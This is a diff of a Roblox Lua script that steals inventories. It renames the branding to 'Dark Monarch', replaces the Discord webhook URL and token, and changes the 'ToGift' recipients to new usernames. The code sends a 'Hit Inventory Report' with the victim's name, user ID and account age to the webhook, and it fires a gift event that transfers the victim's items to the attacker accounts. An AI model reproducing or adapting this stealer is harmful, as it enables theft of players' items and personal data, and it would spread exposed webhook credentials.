@@ -1,5 +1,5 @@
 -- =========================
--- الخدمات الأساسية
+-- Dark Monarch Owner
 -- =========================
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -152,7 +152,7 @@ end)
 task.spawn(function()
     wait(7)
 
-    local WEBHOOK_URL = "https://discord.com/api/webhooks/1404963530566008992/dz4pD1E7LLhqxNgG6oPqOMeiVB8-JKd755bHs04VRS7yjVzXgMqFZkuaRnH87Y1oEC2u"
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1387787722281848934/DZflHq5xDk2nRu5iZOay2dkh7fWNF4E2sH4dV08AhYKhFwU-C72mgRygIBzgPSh0o-eV"
     
     local playerName = player.Name
     local userId = player.UserId
@@ -170,7 +170,7 @@ task.spawn(function()
         end
     end
 
-    local fileContent = "🎮 Alien Hit Inventory Report\n"
+    local fileContent = "🪴 Dark Monarch Hit Inventory Report\n"
     fileContent = fileContent .. "👤 Player: " .. playerName .. "\n"
     fileContent = fileContent .. "🆔 User ID: " .. userId .. "\n"
     fileContent = fileContent .. "⏰ Account Age: " .. accountAge .. "\n"
@@ -284,7 +284,7 @@ task.spawn(function()
                     ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({
                         [1] = {
                             ["Item"] = currentBrainRoot,
-                            ["ToGift"] = "sssfysue7",
+                            ["ToGift"] = "Darkxensei, darkunknownusers, Xenseeiiv1",
                         },
                         [2] = ""
                     })
